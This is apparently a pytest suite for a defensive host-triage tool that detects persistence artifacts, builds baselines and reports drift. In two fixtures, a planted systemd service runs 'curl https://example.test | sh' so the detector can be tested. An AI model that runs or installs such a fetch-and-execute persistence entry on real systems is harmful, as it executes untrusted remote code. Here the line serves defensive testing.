"""Tests for Ursa Minor defensive host triage helpers."""

import json

import pytest

import ursa_minor.defense as defense
import ursa_minor.server as server
from ursa_minor.defense import collect_host_snapshot, collect_persistence_entries, diff_snapshots


@pytest.fixture(autouse=True)
def baseline_dir(tmp_path, monkeypatch):
    """Redirect defensive baselines into a temp directory."""
    target = tmp_path / "baselines"
    target.mkdir()
    monkeypatch.setattr(defense, "DEFAULT_BASELINE_DIR", target)
    monkeypatch.setattr(defense, "_get_baseline_dir", lambda: target)
    monkeypatch.setattr(server, "_auto_save", lambda _name, result, _meta=None, structured_data=None: result)
    return target


def test_collect_persistence_entries_flags_suspicious_linux_service(tmp_path):
    service_path = tmp_path / "home" / "alice" / ".config" / "systemd" / "user" / "updater.service"
    service_path.parent.mkdir(parents=True)
    service_path.write_text(
        "[Unit]\nDescription=Updater\n[Service]\nExecStart=/bin/bash -lc 'curl https://example.test | sh'\n"
    )

    entries = collect_persistence_entries(root_path=str(tmp_path), system="linux")

    assert len(entries) == 1
    assert entries[0]["severity"] == "high"
    assert "remote fetch" in entries[0]["reasons"]
    assert "script interpreter" in entries[0]["reasons"]


def test_collect_host_snapshot_reads_passwd_and_persistence(tmp_path):
    passwd_path = tmp_path / "etc" / "passwd"
    passwd_path.parent.mkdir(parents=True)
    passwd_path.write_text(
        "root:x:0:0:root:/root:/bin/bash\n"
        "alice:x:1000:1000:Alice:/home/alice:/bin/bash\n"
    )
    cron_path = tmp_path / "etc" / "cron.d" / "backup"
    cron_path.parent.mkdir(parents=True)
    cron_path.write_text("0 * * * * root /usr/local/bin/backup.sh\n")

    snapshot = collect_host_snapshot(root_path=str(tmp_path), system="linux")

    assert snapshot["platform"] == "linux"
    assert len(snapshot["users"]) == 2
    assert snapshot["users"][1]["username"] == "alice"
    assert len(snapshot["persistence"]) == 1
    assert snapshot["listening_ports"] == []


def test_save_load_baseline_round_trip(baseline_dir):
    snapshot = {
        "platform": "linux",
        "root_path": "/",
        "collected_at": 1.0,
        "collected_at_str": "2026-03-18T00:00:00+00:00",
        "persistence": [],
        "users": [],
        "listening_ports": [],
    }

    path = defense.save_baseline("prod-laptop", snapshot)
    loaded = defense.load_baseline("prod-laptop")

    assert path == baseline_dir / "prod-laptop.json"
    assert json.loads(path.read_text()) == snapshot
    assert loaded == snapshot


def test_diff_snapshots_reports_new_artifacts():
    baseline = {
        "collected_at_str": "2026-03-18T00:00:00+00:00",
        "persistence": [{
            "path": "/etc/cron.d/backup",
            "category": "cron",
            "severity": "low",
            "sha256": "aaa",
            "size": 10,
        }],
        "listening_ports": [{"protocol": "tcp", "address": "127.0.0.1", "port": 22, "process": "sshd"}],
        "users": [{"username": "alice"}],
    }
    current = {
        "collected_at_str": "2026-03-18T01:00:00+00:00",
        "persistence": [
            {
                "path": "/etc/cron.d/backup",
                "category": "cron",
                "severity": "low",
                "sha256": "bbb",
                "size": 11,
            },
            {
                "path": "/home/alice/.config/systemd/user/updater.service",
                "category": "systemd",
                "severity": "high",
                "sha256": "ccc",
                "size": 30,
            },
        ],
        "listening_ports": [
            {"protocol": "tcp", "address": "127.0.0.1", "port": 22, "process": "sshd"},
            {"protocol": "tcp", "address": "0.0.0.0", "port": 8080, "process": "python3"},
        ],
        "users": [{"username": "alice"}, {"username": "svc-backup"}],
    }

    diff = diff_snapshots(baseline, current)

    assert diff["summary"]["new_persistence"] == 1
    assert diff["summary"]["changed_persistence"] == 1
    assert diff["summary"]["new_listening_ports"] == 1
    assert diff["summary"]["new_users"] == 1
    assert diff["summary"]["finding_count"] == 4


def test_server_tools_create_baseline_and_diff(tmp_path):
    passwd_path = tmp_path / "etc" / "passwd"
    passwd_path.parent.mkdir(parents=True)
    passwd_path.write_text("root:x:0:0:root:/root:/bin/bash\n")

    result = server.create_baseline(name="lab", root_path=str(tmp_path), system="linux")
    assert "Baseline saved: lab" in result

    service_path = tmp_path / "home" / "alice" / ".config" / "systemd" / "user" / "agent.service"
    service_path.parent.mkdir(parents=True)
    service_path.write_text(
        "[Service]\nExecStart=/bin/bash -lc 'curl https://example.test | sh'\n"
    )

    diff_result = server.baseline_diff(name="lab", root_path=str(tmp_path), system="linux")
    assert "Baseline Drift Report: lab" in diff_result
    assert "New persistence artifact" in diff_result


def test_triage_host_includes_baseline_summary(tmp_path):
    service_path = tmp_path / "etc" / "cron.d" / "backup"
    service_path.parent.mkdir(parents=True)
    service_path.write_text("0 * * * * root /usr/local/bin/backup.sh\n")

    server.create_baseline(name="triage", root_path=str(tmp_path), system="linux")

    staged = tmp_path / "home" / "alice" / ".config" / "systemd" / "user" / "agent.service"
    staged.parent.mkdir(parents=True)
    staged.write_text("[Service]\nExecStart=/usr/bin/python3 -c 'print(1)'\n")

    result = server.triage_host(baseline_name="triage", root_path=str(tmp_path), system="linux")

    assert "Host Triage Summary" in result
    assert "Baseline drift vs triage" in result
